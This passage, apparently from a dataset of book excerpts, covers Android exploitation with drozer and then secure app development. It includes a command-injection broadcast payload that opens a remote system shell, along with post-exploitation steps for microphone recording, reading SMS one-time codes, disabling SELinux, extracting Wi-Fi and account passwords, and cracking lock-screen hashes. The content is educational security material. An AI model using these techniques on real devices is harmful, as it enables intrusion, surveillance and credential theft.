/tmp/tmp2bd94X/agent.apk\n$ drozer server upload /agent.apk /tmp/tmp2bd94X/agent.apk\n--server 192.168.1.112:80\n3. Bundle weasel inside an application with zero permissions. You find the weasel binary inside drozer at\n/src/drozer/lib/weasel/armeabi/w.\n4. When the application is first run, copy weasel to your application's data directory and mark it as world\nreadable.\n5. Send a broadcast with the following parameters:\nAction: com.android.sec.FTAT_DUMP\nExtra string named 'FILENAME':\n../../../../../dev/null; cd\n/data/data/com.sec.android.app.servicemodeapp;cat\n/data/data/my.evil.application/w > w;\nchmod 770 w; ./w 192.168.1.112 80;#\nThis injects perfectly to complete the command and copy weasel from your application's data directory,\nmark it executable, and run it with your Internet-facing server as its arguments. This results in the\nfollowing sessions shown in your drozer server log:\n2014-11-15 20:10:54,037 - drozer.server.protocols.shell - INFO -\naccepted shell from 192.168.1.109:58585\n2014-11-15 20:10:54,134 - drozer.server.protocols.http - INFO - GET\n/agent.jar\n2014-11-15 20:10:54,136 - drozer.server.protocols.http - INFO - GET\n/agent.apk\n2014-11-15 20:10:56,025 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from a4cjgha9cn2ic\n2014-11-15 20:11:01,331 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 1b6b125f54bdda30\nQuerying the server reveals that you received two drozer sessions from this command: one with Context and the\nother one likely without, because it used the app_process method to load drozer:\n$ drozer console devices --server 192.168.1.112:80\nList of Bound Devices\nDevice ID Manufacturer Model Software\n1b6b125f54bdda30 samsung GT-I9300 4.0.4\na4cjgha9cn2ic samsung GT-I9300 4.0.4\nSession 1b6b125f54bdda30 is an installed drozer agent that was possible because weasel was loaded inside the\nvulnerable application, which was running as the system user. The session a4cjgha9cn2ic would still be running\nas the system user itself but would not have Context. This is very interesting as this allows a huge degree of\ncontrol over the device from within a drozer session! Connecting to this session confirms that we are indeed\nrunning as the system user but do not have Context:\n$ drozer console connect a4cjgha9cn2ic --server 192.168.1.112:80\n.. ..:.\n..o.. .r..\n..a.. . ....... . ..nd\nro..idsnemesisand..pr\n.otectorandroidsneme.\n.,sisandprotectorandroids+.\n..nemesisandprotectorandroidsn:.\n.emesisandprotectorandroidsnemes..\n..isandp,..,rotectorandro,..,idsnem.\n.isisandp..rotectorandroid..snemisis.\n,andprotectorandroidsnemisisandprotec.\n.torandroidsnemesisandprotectorandroid.\n.snemisisandprotectorandroidsnemesisan:\n.dprotectorandroidsnemesisandprotector.\ndrozer Console (v2.3.4)\ndz-limited> permissions\nHas ApplicationContext: NO\ndz-limited> shell\nsystem@android:/data/data/com.sec.android.app.servicemodeapp $ id\nuid=1000(system) gid=1000(system) groups=1001(radio),1006(camera),\n1007(log),1015(sdcard_rw),1023(media_rw),2001(cache),\n3001(net_bt_admin),3002(net_bt),3003(inet),3007(net_bw_acct)\nYou can use this access to install additional APKs or perform other post-exploitation techniques, which are\ndiscussed later in the section, “Infiltrating User Data.”\nTIP\nInside the drozer console are environment variables that can be controlled by the user. You find them by\ntyping env as follows:\ndz-limited> env\nPATH=/data/data/com.sec.android.app.servicemodeapp/bin:/sbin:\n/vendor/bin:/system/sbin:/system/bin:/system/xbin\nWD=/data/data/com.sec.android.app.servicemodeapp\nSometimes when you use the drozer JAR agent to get a session, it cannot correctly determine the exploited\napplication's private data directory. It is crucial for the functioning of drozer to have a directory that it can\nread and write temporary files to. If you are in a drozer session and it is not behaving correctly and\nthrowing errors, check the working directory (WD) environment variable. If required, set it manually to a\ndirectory where you know you have access.\nFor the previous example, you can use the following code and have drozer still work correctly:\ndz-limited> set WD=/data/data/com.android.systemui\nThis is possible because the com.android.systemui application also uses a sharedUserId of\nandroid.uid.system, which means that they both get assigned a UID of 1000 (system). If you recall from\nthe “Application Sandbox” section in Chapter 6, applications making use of sharedUserId's can access each\nother's private data directory. The WD environment variable affects many areas of code and needs to be\ncorrect. It also controls in what directory you are initially based when using the shell:\ndz-limited> shell\nsystem@android:/data/data/com.android.systemui $\nThis example may seem outdated; however, the fundamental concepts are absolutely relevant to the latest\ndevices. A more recent example that works on Android 4.4 devices and prior is the ObjectInputStream\nvulnerability detailed in CVE-2014-7911. An exploit can make use of this vulnerability to attack the system\nservice and gain code execution as the system user. More information about the vulnerability can be found at\nhttp://seclists.org/fulldisclosure/2014/Nov/51.\nAnother technique that malware could use to inject itself into other applications is using Google Bug #13678484\n—the “Fake ID” Vulnerability. This was presented at Blackhat USA 2014 by Jeff Forristal of Bluebox Security.\nIt was discovered that the functions used to perform validation that a certificate is actually signed by its issuer\nwas non-existent. This lead to application certificates being able to claim that they were signed by a specific\ncertificate when they were not. This is generally not a problem for the installation of Android applications, as\nthe issuer of a certificate is never checked. However, this is a problem in the few instances where the issuer is\nchecked. One of these instances is WebView plug-ins. WebView plug-ins get loaded into all applications that\ncontain a WebView and have plug-ins enabled. Android is only supposed to acknowledge an application as\ncontaining a valid plug-in if it was signed by the Adobe certificate. However, by including the Adobe public\ncertificate as well as a developer certificate with an Issuer field claiming to be signed by “Adobe Systems\nIncorporated” in the same chain, the system would accept that it has been signed by Adobe.\nAs part of Jeff's demo, he created a malicious WebView plug-in that included a connect-back to a drozer server\nfrom each of the infected applications. No permissions are required at all for this attack as your code is loaded\ninto other applications and you would assume the permissions of the infected applications. This attack works\nonly on Android 4.3 and earlier due to the change in the WebView plug-in code that was present in later\nversions. For more information about this vulnerability and exploitation techniques, watch his presentation at\nhttp://www.youtube .com/watch?v=MDjvyr_B8WU or visit Bluebox Security's technical blog at\nhttps://bluebox.com/technical/blackhat-fake-id-talk-material-and-follow-up/.\nInfiltrating User Data\nMany post-exploitation tricks can be done on an Android device. This section presents a fraction of these that\nreaders may find interesting and easy to perform.\nUsing Existing drozer Modules\nThis section presents some of the available drozer modules that exist in the repository at the time of writing to\nperform common post-exploitation tasks. To install the entire host of available post-exploitation modules,\nperform module install post inside the drozer console or by using the drozer module option from outside the\nconsole. To write your own drozer modules, review the available documentation at\nhttps://github.com/mwrlabs/drozer/wiki#drozer- developers and ask questions in the Issue Tracker if\nanything is unclear.\nRecord Microphone\nIt is possible to record from the microphone of the device you have compromised. The requirements are that\nyou have compromised an application with the RECORD_AUDIO permission and have retained Context. You could\nalso do this by installing a rogue drozer agent that satisfies these requirements by default. Running the module\nprovides the following output:\ndz> run post.capture.microphone /path/to/save/recording.3gp\n[*] Performing crazy reflection gymnastics\n[*] Preparing recorder attributes\n[+] Recording started\n[+] Press [Enter] to stop recording\n[+] Stopped...downloading recording\n[+] Done.\nThis module saves the recording using the 3GP file format, which is heavily compressed. This means it is\nefficient on storage and bandwidth.\nRead and Send SMS Messages\nSMS messages can be read and new messages sent with the appropriate access on a device. Reading SMS\nmessages could be used by an advanced attacker to overcome the use of two-factor authentication that uses OTP\ntokens sent via SMS. This solution is common in the banking world. To read all SMS messages containing the\nword “OTP,” you could run the following command:\ndz> run post.sms.read -f OTP\n| body | date_sent | address | person |\n...\n| Your bank:-) You are about to make a Once Off payment of R250.00 to\n...779823 at Other Bank. Confirmation OTP:1458 | 1415265937000 |\n+27820070194 | null |\nYou send an SMS as follows:\ndz> run post.sms.send 0745678323 \"My message text\"\nSent SMS.\nUsing these modules requires the installation of a rogue drozer agent or the compromise of an application\nholding the READ_SMS or SEND_SMS permissions, respectively, with Context retained.\nRead Contacts\nSimilarly to the post.read.sms module shown in the previous example, reading stored contacts on the device is\npossible with a search filter. The search filter includes the contact's name and number. Here is an example of\nsearching by someone's surname:\ndz> run post.contacts.read -f snowden\n| Edward Snowden | +7 922 555-12-34 |\nThis module has the same requirements as reading SMS messages except that it needs the READ_CONTACTS\npermission.\nUser GPS Location\nMost Android devices have GPS features available. Even those that do not can perform various techniques such\nas cellphone tower triangulation or Wi-Fi hotspot proximity markers to determine the user's rough location.\nThese can be used by the post.capture.location module to determine a user's last known location:\ndz> run post.capture.location\nLatitude, Longitude: 63.585483,100.626953\nGoogle Maps link: https://www.google.com/maps/place/63.585483,100.626953\nThis module has the same requirements as the previous modules presented except that it needs either the\nACCESS_COARSE_LOCATION or ACCESS_FINE_LOCATION permissions to function. On Android 4.4 and above this\nmodule also may require the Location Services to be enabled by the user.\nCapturing the User's Screen\nWhat a user does on his device is very personal. An unknown party being able to take screenshots or record\nvideos of his activities is the ultimate infringement of privacy. Take a look at how to take screenshots on a\ndevice using the screencap binary. This standard binary is available on Android and allows the screen's\nframebuffer to be read and saved as a PNG file. Look back at that Samsung Service Mode Application exploit\nperformed earlier that exploited the application to inject drozer, which then runs as the system user. Inside the\ndrozer shell, even though you don't have Context you are able to generate a screenshot of the device as follows:\ndz-limited> run post.capture.screenshot\n[+] Done. Saved at /home/tyrone/1416173613.png\nThis module also opens the screenshot automatically in your default picture viewer on your computer. Doing\nthis is possible because you are running as the system user. This user, as well as the shell and root users, can\nperform this action. This module can be used alongside an installed version of minimal su that ensures the user\nis not prompted when requesting a root shell.\nYou can also create video recordings of the screen. A standard binary available on Android devices named\nscreenrecord allows you to do this. This example uses the Nexus 7 device running Android 5.0 Lollipop. A\nprevious example showed how to install a rogue drozer agent on the device. However, using this binary requires\nsystem, shell, or root access on the device. At the time of writing, no publicly available vulnerability allowed us\nthis access from a normally installed application. If you dig deeper into the device you may notice that the user\nhas rooted it. Possibly if the user accepts the root manager prompt you would be able to obtain further root\naccess on the device. If this happened, you could run the screenrecord binary, which is wrapped conveniently in\na drozer module at post.capture.screenrecording. Running this module to record for 10 seconds returns the\nfollowing:\ndz> run post.capture.screenrecording -l 10\n[-] You are not a privileged user and no minimal su binary available\n(see tools.setup.minimalsu).\nIt tells you that you are not in a position to use this module because it does not consider prompting the user for\nroot as a valid way of obtaining root. To override this behavior, add the --override-checks flags to the module.\nWhen you do this you get the following:\ndz> run post.capture.screenrecording -l 10 --override-checks\n[-] You are not a privileged user and no minimal su binary available\n(see tools.setup.minimalsu).\n[*] Continuing...\nIt continues and tries to execute the command using su. After a while it seems to hang at this output because of\nSELinux not allowing the root user to copy a file into drozer's directory. This is confirmed by the following\nentries in logcat:\nI/ServiceManager(13131): Waiting for service SurfaceFlinger...\nE/ServiceManager( 126): SELinux: getpidcon(pid=13131) failed to\nretrieve pid context.\nE/ServiceManager( 126): find_service('SurfaceFlinger') uid=0 -\nPERMISSION DENIED\nW/servicemanager( 126): type=1400 audit(0.0:114): avc: denied { search\n} for name=\"13131\" dev=proc ino=178268 scontext=u:r:servicemanager:s0\ntcontext=u:r:init:s0 tclass=dir\nYou can issue getenforce and check the status of SELinux on the device:\ndz> !getenforce\nEnforcing\nWith root access you can turn SELinux off by placing it in Permissive mode as follows:\ndz> !su -c setenforce Permissive\ndz> !getenforce\nPermissive\nRunning the module again reveals that it works:\ndz>> run post.capture.screenrecording -l 10 --override-checks\n[-] You are not a privileged user and no minimal su binary available\n(see tools.setup.minimalsu).\n[*] Continuing...\n[+] Done. Saved at /home/tyrone/1416174087.mp4\nFigure 8.12 shows a still frame of the recording where the user's lock screen pattern was captured.\nFigure 8.12 A screen recording of capturing the user's lock screen pattern\nStealing Files from SD Card\nThe SD card can contain all kinds of juicy files stored by the user. On Android version 4.3 and earlier, any form\nof code running a device would be able to access the SD card. On Android 4.4 and later it requires the\ncompromise or installation of an application holding the READ_EXTERNAL_STORAGE permission. No Context is\nrequired to read the SD card because this access is mapped as a Linux group. Browse the SD card in drozer by\nusing the shell as follows:\ndz> shell\nu0_a275@jflte:/data/data/com.mwr.dz $ cd /sdcard\nu0_a275@jflte:/sdcard $ ls -la\ndrwxrwx--- root sdcard_r 2014-01-01 02:01 Alarms\ndrwxrwx--x root sdcard_r 2014-06-30 18:56 Android\ndrwxrwx--- root sdcard_r 2014-07-22 18:55 Application\ndrwxrwx--- root sdcard_r 2014-09-20 13:09 DCIM\ndrwxrwx--- root sdcard_r 2014-01-01 02:01 Documents\ndrwxrwx--- root sdcard_r 2014-10-20 20:26 Download\n...\nTo download files from the SD card you use the tools.file.download module.\nOther Techniques for Privileged Scenarios\nThis section presents some general techniques that can be used when privileged access has been gained by an\nattacker. It also covers some post-exploitation techniques that would interest attackers with physical access to a\ndevice.\nExtracting Wi-Fi Keys\nThe Wi-Fi passwords of all saved hotspots are stored on an Android device at\n/data/misc/wifi/wpa_supplicant.conf. The following shows the file permissions set on this file on a Nexus 7\nrunning Android 5.0:\nroot@grouper:/ # ls -l /data/misc/wifi/wpa_supplicant.conf\n-rw-rw---- system wifi 363 2014-11-15 16:01 wpa_supplicant.conf\nThis means that system or root user access is required to obtain this file. The group is not mapped to any\npermission in the /system/etc/permissions/platform.xml file and therefore not attainable by third-party\napplications. The following shows that the device had only a single saved network on it:\nroot@grouper:/ # cat /data/misc/wifi/wpa_supplicant.conf\n...\nnetwork={\nssid=\"FileName_MyWifiHotspot\"\npsk=\"my@mAz1ngP@$$w0rD\"\nkey_mgmt=WPA-PSK\npriority=3\n}\nUser Accounts\nUnavoidably, some user accounts will be stored in cleartext on the device. Applications like Gmail make sure\nnever to store the password in cleartext but rather use a password token. However, a regular email client has to\nconnect to a POP3 and SMTP server and provide the actual password, so storing it somewhere is necessary.\nAccounts on the device are stored in /data/system/users/0/accounts.db. The file permissions on this file are as\nfollows:\nroot@grouper:/ # ls -l /data/system/users/0/accounts.db\n-rw-rw---- system system 65536 2014-11-15 16:18 accounts.db\nTo obtain this file an attacker would need system or root access. Downloading this file and opening it with\nsqlite3 is shown here:\n$ sqlite3 accounts.db\n...\nsqlite> .headers on\nsqlite> .tables\naccounts authtokens grants shared_accounts\nandroid_metadata extras meta\n...\nsqlite> select * from accounts;\n_id|name|type|password|previous_name\n1|tyrone@mymail.co.za|com.google.android.gm.pop3|str0ngP@$$w0rd123|\nCracking Patterns, PINs, and Passwords\nIf obtaining the /data/system/gesture.key file when the device is using a pattern lock screen or\n/data/system/password.key when the device is using a PIN or password is possible, then the lock screen code\ncan be cracked. These files are only readable and writable by the system user and so having this access or higher\nis a prerequisite.\nFor cracking a pattern lock, the only requirement is to obtain the gesture .key file. Various tools can crack this\nfile but you can find a nice visual one at https://github.com/sch3m4/androidpatternlock.Providing the\nobtained gesture.key as input to this tool looks as follows:\n$ python crack.pattern.py gesture.key\n################################\n# Android Pattern Lock Cracker #\n# v0.1 #\n# ---------------------------- #\n# Written by Chema Garcia #\n# http://safetybits.net #\n# chema@safetybits.net #\n# @sch3m4 #\n################################\n[i] Taken from: http://forensics.spreitzenbarth.de/2012/02/28/cracking-\nthe-pattern-lock-on-android/\n[+] Checking length 3\n[+] Checking length 4\n[+] Checking length 5\n[:D] The pattern has been FOUND!!! => 01258\n[+] Gesture:\n----- ----- -----\n| 1 | | 2 | | 3 |\n----- ----- -----\n----- ----- -----\n| | | | | 4 |\n----- ----- -----\n----- ----- -----\n| | | | | 5 |\n----- ----- -----\nThis shows the sequence that the pattern lock follows in a visual manner. To crack a PIN or password lock,\npassword.key is needed as well as the salt used for the hash. The lockscreen.password_salt can be found in\ndifferent places depending on the device; however, the following are two common locations:\n/data/system/locksettings.db\n/data/data/com.android.providers.settings/databases/settings.db\nAfter the appropriate database is discovered to contain lockscreen .password_salt you can extract it as follows:\n$ sqlite3 settings.db \"select value from secure where name =\n'lockscreen.password_salt'\"\n6286553008896743476\nYou find the salted hash value of the password at the end of the password .key file and can extract it as follows:\n$ tail --bytes 32 password.key\n8C10A1204AB6B8E3B7F155A6D7C9251E\nAfter you obtain the salt and the salted hash, you can use one of the many tools available to perform the\ncracking. One of the most mature in its space is oclHashcat (see http://hashcat.net/oclhashcat/) and its\nvariants.\nReading Extended Clipboards\nAny application with Context can read a user's clipboard, which may reveal sensitive information, especially if\nthe user makes use of a password manager. This attack was shown in “Other Communication Mechanisms” in\nChapter 7. It would be better for an attacker to be able to read a history of the last 20 items that were placed on\nthe clipboard. This would likely reveal various passwords if the user made use of a password manager. Some\ndevice manufacturers, like Samsung, have an extended clipboard feature that does this. It stores the last 20\nitems in the /data/clipboard/ directory. Here is snipped output of this directory:\nshell@jflte:/ $ ls -l /data/clipboard/\ndrwxrwxr-x system system 2014-11-07 10:13 11191631441356_824_375\ndrwxrwxr-x system system 2014-11-13 21:03 1120027848334_463_93\ndrwxrwxr-x system system 2014-11-12 01:43 1129463352437_797_564\ndrwxrwxr-x system system 2014-11-13 21:19 11307915521940_67_32\ndrwxrwxr-x system system 2014-11-14 01:42 11310498884247_111_65\ndrwxrwxr-x system system 2014-11-11 21:35 11669478483512_725_396\n...\nListing the directory that was updated most recently reveals the following:\nshell@jflte:/ $ ls -l /data/clipboard/11669478483512_725_396/\n-rw------- system system 238 2014-11-11 21:35 clip\nEach directory has a clip file that is owned by the system user, which means the attacker must have this access\nor higher. Retrieving this file and inspecting it reveals that it is not plaintext. Running the file utility against it\nshows that it is a serialized Java object:\n$ file clip\nclip: Java serialization data, version 5\nYou can use a nifty tool named jdeserialize (see https://code.google.com/p/jdeserialize/) to inspect this\nobject. Doing so shows that the actual clip value was “Hi there!”:\n$ java -jar jdeserialize-1.2.jar -noclasses clip\nread: android.sec.clipboard.data.list.ClipboardDataText _h0x7e0003 =\nr_0x7e0000;\n//// BEGIN stream content output\nandroid.sec.clipboard.data.list.ClipboardDataText _h0x7e0003 =\nr_0x7e0000;\n//// END stream content output\n//// BEGIN instance dump\n[instance 0x7e0003:\n0x7e0000/android.sec.clipboard.data.list.ClipboardDataText\nfield data:\n0x7e0000/android.sec.clipboard.data.list.ClipboardDataText:\nmValue: r0x7e0004: [String 0x7e0004: \"Hi there!\"]\n0x7e0002/android.sec.clipboard.data.ClipboardData:\nLOG_LEN: 20\nmFormatID: 2\nmIsProtected: false\n]\n//// END instance dump\nAgain, being able to read clipboards is particularly useful if you know that the owner of the device you\ncompromised uses a password manager.\nSimulating User Interaction\nAny post-exploitation techniques requiring a tap on the screen in a particular place, text to be typed in, or some\nother user action can likely be done using the input script present on Android devices. Think about any second\nfactor authentication solutions that require a user to accept a prompt to log in to a VPN or approve a banking\ntransaction. A technique that allows the attacker to interact with the screen could help bypass the security of\nthese additional security mechanisms.\nHere are the available options for the input script on a KitKat device:\n$ adb shell input\nUsage: input [<source>] <command> [<arg>...]\nThe sources are:\ntrackball\njoystick\ntouchnavigation\nmouse\nkeyboard\ngamepad\ntouchpad\ndpad\nstylus\ntouchscreen\nThe commands and default sources are:\ntext <string> (Default: touchscreen)\nkeyevent [–longpress] <key code number or name> ... (Default:\nkeyboard)\ntap <x> <y> (Default: touchscreen)\nswipe <x1> <y1> <x2> <y2> [duration(ms)] (Default: touchscreen)\npress (Default: trackball)\nroll <dx> <dy> (Default: trackball)\nTo use the input script to tap on the screen, you can run it as follows:\n$ adb shell input tap 520 960\nThis taps exactly in the middle of the screen. To find a screen's dimensions you can use the dumpsys command\nand filter by an attribute named mUnrestrictedScreen:\n$ adb shell dumpsys window | grep mUnrestrictedScreen\nmUnrestrictedScreen=(0,0) 1080x1920\nThe input script can be used by the shell, system, or root users. It can also be used by applications holding the\nINJECT_EVENTS permission; however, this is protected by the signature protection level.\nExtracting Application Data with Physical Access\nPhysical access to a device allows the extraction of user data and potentially sensitive application data through\nthe use of the ADB backup functionality. Connect the device to your computer and perform the following to\nback up all data of applications that do not have the allowBackup manifest attribute set to false, as well as the\nSD card:\n$ adb backup -all -shared\nOn the device's screen do not use a password and tap Back Up My Data. This takes a while. Place a backup.ab file\nin the current working directory on your computer. You can extract it in the same way presented in Chapter 7,\n“Exploiting Misconfigured Package Attributes.”\nSummary\nThis chapter showed the multiple attack vectors that could be used to gain a foothold on a device. It also\nexplored some post-exploitation activities that could be used to escalate privileges and infiltrate user data. All\nthe remote exploits presented that allowed initial code execution on the device were due to vulnerabilities in\ninstalled applications, which highlights the importance of developers implementing a secure development\nlifecycle, especially if the application is going to be installed on millions of devices. The content presented in this\nchapter may seem very offensive by nature. However, these are some of the techniques that a real attacker\nwould employ to gain access to your device. As a developer or security professional, knowing the types of attacks\nthat are possible is crucial for fixing or preventing them for the future. Chapter 9 will discuss ways to ensure\nthat individual applications are secured.",
    "question": "What are the different types of vulnerabilities that can be found in Android applications and how can they be exploited?",
    "summary": "The text discusses various methods to find and exploit vulnerabilities in Android devices, including using drozer for automated scanning, man-in-the-middle attacks with tools like Ettercap and Burp Suite, and exploiting local vulnerabilities through rogue agents or misconfigured permissions. It also covers techniques for gaining root access, bypassing lock screens, and extracting user data, emphasizing the importance of secure development practices to prevent such exploits."
  },
  {
    "start": 47,
    "end": 50,
    "text": "CHAPTER 9\nWriting Secure Android Applications\nYou have explored many different ways to find vulnerabilities in applications and exploit them. This chapter\nlooks at ways you can prevent these vulnerabilities in your applications by implementing the right security\nmechanisms.\nProtections against common vulnerabilities such as code injection, logic flaws, insecure storage, application\nconfiguration, insecure communication channels, logging, and others will be explored. Some of these\nmechanisms may be simple configuration changes and others require changes at the code level.\nPrinciple of Least Exposure\nThe fewer entry points there are into an application, the smaller the attack surface is. To minimize an\napplication's attack surface, the application developer needs to perform the following tasks iteratively:\n1. Consider all entry points into the application. This involves finding every single portion of the application\ncode that is exposed in some way to input from outside sources.\n2. Remove any entry points that can be. An application that has minimal entry points has already reduced its\nrisk exposure.\n3. If an entry point has to be exposed, perform security checks at the entry points before running any other\ncode.\nApplication Components\nAn application should reduce its exported application components down to the essentials. The fewer exported\ncomponents, the better. In the following application only its main activity is exported so that it can be launched.\nNo other components are exposed:\ndz> run app.package.attacksurface com.myapp.secure\nAttack Surface:\n1 activities exported\n0 broadcast receivers exported\n0 content providers exported\n0 services exported\nThis exposure level would be considered an ideal case and can be achieved only if the application does not\nprovide any integration opportunities at all to other applications on the device.\nData Storage\nIf the storage of any application data is not absolutely necessary, simply don't store it. This includes storing data\nin the application's private data directory or on the SD card.\nInteracting with Untrusted Sources\nAn application that retrieves information from the SD card, the Internet, Wi-Fi, Bluetooth, or any other source\nthat is not directly under the control of the application should be scrutinized for authenticity. Authentication\ncould be in the form of signature checks on the information, some sort of encryption that confirms the identity\nof the source who sent this information, or some other validation scheme. Be careful of classloading or running\nexecutables from untrusted locations. Consider where they have been loaded from and whether they are stored\nsecurely. Having a way to cryptographically verify that the code is legitimate before using it is best.\nRequesting Minimal Permissions\nRequest the fewest permissions necessary for your application to function correctly. Performing a task in a way\nthat does not require an extra permission would generally be considered the most secure option. In addition to\nthis, requesting as few permissions as possible helps put more security-minded users at ease. Doing so also\nreduces the impact of someone exploiting your application. For an example of this theory, refer to Chapter 8\nwhere applications that held the INSTALL_PACKAGES permissions were exploited to devastating effect. This\nrecommendation is also relevant for requesting the use of powerful shared users such as android.uid.system.\nShared users should only be used if absolutely necessary.\nBundling Files Inside the APK\nBefore releasing your app to the world, take the time to unzip the APK and check what is inside because you\nmight find other files unintentionally included inside your APK. You wouldn't want someone to be able to\ninadvertently obtain a file containing SSH credentials for your testing server that was part of the project during\ndevelopment or other sensitive files.\nEssential Security Mechanisms\nThis section presents a set of essential security mechanisms that you should put in place to ensure that an\napplication is safe for general use.\nReviewing Entry Points into Application Components\nYou should review each entry point into application code that is accessible over the IPC sandbox to ensure that\nthe maximum possible level of security is provided. The easiest way to review your own code is to trace the\nfunctions that handle code from other applications inside each exported component. Table 9.1 details the\nmethods that are relevant for each of the application components.\nTable 9.1 Methods per application component that receive data from other applications\nCOMPONENT METHOD\nActivity onCreate()\nBroadcast Receiver onReceive()\nContent Provider query() insert() update() delete()openFile()\nService onStartCommand()onBind()\nWhen an application component is exported, the functionality that is defined in each method is available to\nother applications. Ensure that any code paths that exist in these functions are deliberate and cannot lead to\nunintended consequences.\nTo maintain a high level of security, your application should make appropriate use of permission protection on\nall defined application components, including activities, broadcast receivers, services, and content providers that\nare exported. No components should be available to other applications on the same device that are not protected\nby a custom-defined permission, unless this component is intended for public use and great care has been taken\nin its implementation. This also goes for broadcast receivers registered at runtime and broadcasts sent to other\ntrusted applications.\nYou can enforce permissions by setting the android:permission attribute of a defined component in the\nmanifest. To ensure that all components are protected by the same permission at a top level, set the\nandroid:permission attribute in the <application> tag. This applies the stated permission to all application\ncomponents defined in the manifest.\nThe most important aspect of securing a custom permission is ensuring that the correct protection level is set\non it. The signature protection level ensures that only applications signed with the same certificate are able to\nrequest the permission. Setting a protection level of normal or dangerous means that another application can\nrequest this permission and the system will grant it. This will allow a malicious application to interact with any\ncomponents that require this permission to be held by the caller and could inadvertently expose application data\nor the component to further attack. Here is an example of a custom permission with the signature protection\nlevel:\n<permission android:name=\"com.myapp.CUSTOM\"\nandroid:protectionLevel=\"signature\" />\nThe use of permissions is a general recommendation that goes a long way toward securing an application. The\nremainder of this section explores additional recommendations that are specific to each of the application\ncomponents.\nSecuring Activities\nIn addition to all standard application component security measures, you should consider the following for\nactivities.\nTask Manager Snooping\nTwo configurations enable you to avoid having the contents of your application's activities from appearing in the\nrecent application list: You can choose to show a blank screen in the Recent list, or remove the entry from the\nlist altogether. To make an activity show as a blank screen, implement the following code inside the\nonCreate()method of the activity:\ngetWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);\nThe FLAG_SECURE parameter ensures that the contents will not appear in screenshots.\nTo disallow the task from being shown in the Recent Apps list altogether, opt to exclude it by setting the\nandroid:excludeFromRecents attribute to true in each activity in the application manifest. You can also perform\nthis action within code when starting a new activity by adding the FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS flag set\nas follows:\nintent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);\nTapjacking\nTo ensure that performing tapjacking attacks on sensitive activities within your application is not possible, you\ncan apply attributes to a View. You can set the following attribute in the layout file of your activity on each item\nthat inherits from a View:\nandroid:filterTouchesWhenObscured=\"true\"\nTo prevent touches from being sent through all elements on the activity, apply that attribute to the top-level\nlayout of the activity. You can also accomplish this programmatically by using the\nsetFilterTouchesWhenObscured method as follows:\nview.setFilterTouchesWhenObscured(true);\nThis ensures that touches cannot be sent to your activity when another application's View overlays your activity.\nDisabling Additions to the Android Dictionary\nIn normal input boxes on Android, unknown words are automatically added to the user's dictionary. This is\nuseful for everyday applications. However, sensitive applications may contain input boxes where the text that\nusers type should not be entered into the dictionary for a number of reasons, such as transmission of codes,\nencryption keys, passwords that do not need masking, and so on. If an attacker gains access to a device through\na malicious application or by compromising an installed application, he might be in a position to retrieve the\ncontents of the dictionary.\nTo stop any unwanted words or numbers from being added to the Android dictionary, set the\nandroid:inputType=\"textVisiblePassword\" attribute on an EditText box.\nProtecting Against Fragment Attacks\nOn Android versions 4.3 and lower, explicitly protecting against fragment attacks is not possible. The only\navailable protection is to not expose the vulnerable component. This means that no activity that extends\nPreferenceActivity should be exported to other applications.\nSince Android 4.4, protecting against fragment attacks is possible through the use of a new method in the\nPreferenceActivity class named isValidFragment. You must explicitly override this method to allow the\nfragment to be loaded within the activity. The following code provides a whitelist of fragments that can be\nloaded within this activity:\n@Override\nprotected boolean isValidFragment(String fragmentName)\n{\nString[] validFragments = {\"com.myapp.pref.frag1\",\n\"com.myapp.pref.frag2\"};\nreturn Arrays.asList(validFragments).contains(fragmentName);\n}\nEnsuring Secure Trust Boundaries\nIf your application contains a login screen or any other form of trust boundary, then take care as to how it is\nhandled. If your login activity contains a way to start activities that were only intended for trusted users, the\nauthentication model of the application may be defeated.\nThus, making sure that no way exists to open an activity that is intended for authenticated users from an\nunauthenticated area of the application such as a login activity is important. A more involved solution to this\nmay be to implement an application-wide variable for tracking whether a user is authenticated. Authenticated\nactivities should be available only after the user has passed the authentication check, which should be\nperformed when the activity is first started. If the user has not authenticated, the activity should be closed\nimmediately.\nMasking Password Displays\nAny passwords that a user has to type in should be masked. You do this using an EditText box with the attribute\nandroid:inputType=\"textPassword\". This is sufficient to protect user passwords from prying eyes.\nIf the default way that Android masks passwords is insufficient for your implementation then you can code your\nown TransformationMethod that handles the way that the password displays. You can set it as follows:\npasswordBox.setTransformationMethod(new CustomTransformationMethod());\nScrutinizing Browsable Activities\nIf you make use of activities that have an intent filter that contain the BROWSABLE category then you should be\naware that it is possible to interact with this activity from a web browser. As seen in Chapter 8, making an\nactivity BROWSABLE makes it a high value target for an attacker and exploitation of issues inside the activity are\ngenerally trivial.\nIf your activity does not explicitly require being BROWSABLE then it should be removed. However, if you have\nlegitimate reasons for using it then you must consider all possible intents that could cause actions to take place\nautomatically inside your activity. If an attacker is able to send an intent that abuses some logic flaw or\nfunctionality inside your application, then you may be opening up the device owner to an unnecessary level of\nrisk.\nSecuring Content Providers\nThis section explores code injection and manifest misconfiguration vulnerabilities that are commonly\ndiscovered in content providers.\nDefault Export Behavior\nThe default export behavior of content providers prior to API version 17 has been covered in Chapter 7; however,\nthis section serves as a reminder. To ensure that a content provider is consistently not exported across all\nversions of Android explicitly, set it as android:exported=”false” in its manifest declaration as shown in the\nfollowing example:\n<provider\nandroid:name=\".ContentProvider\"\nandroid:authorities=\"com.myapp.ContentProvider\"\nandroid:exported=\"false\" >\n</provider>\nSQL Injection\nContent providers making use of SQLite in their implementation may be prone to SQL injection attacks if user\ninput is directly used inside a SQL statement. This may be because a developer has used the rawQuery() method\nfrom SQLiteDatabase by concatenating SQL queries directly with user input.\nTo protect against SQL injection attacks on Android you can use prepared statements as you would to protect\ninputs from web applications. The following example shows the use of a rawQuery() with prepared statements.\nThe database variable is of type SQLiteDatabase.\nString[] userInput = new String[] {\"book\", \"wiley\"};\nCursor c = database.rawQuery(\"SELECT * FROM Products WHERE type=?\nAND brand=?\", userInput);\nYou can do this in a similar fashion using the query()method where the selection can contain the questions\nmarks and be replaced with content in selectionArgs.\nString[] userInput = new String[] {\"book\", \"wiley\"};\nCursor c = database.query(\"Products\", null, \"type=? AND brand=?\",\nuserInput, null, null, null);\nFor actions other than querying, using the SQLiteStatement class to execute a prepared statement is possible, as\nshown here:\nSQLiteStatement statement = database.compileStatement(\"INSERT INTO\nProducts (type, brand) values (?, ?)\");\nstatement.bindString(1, 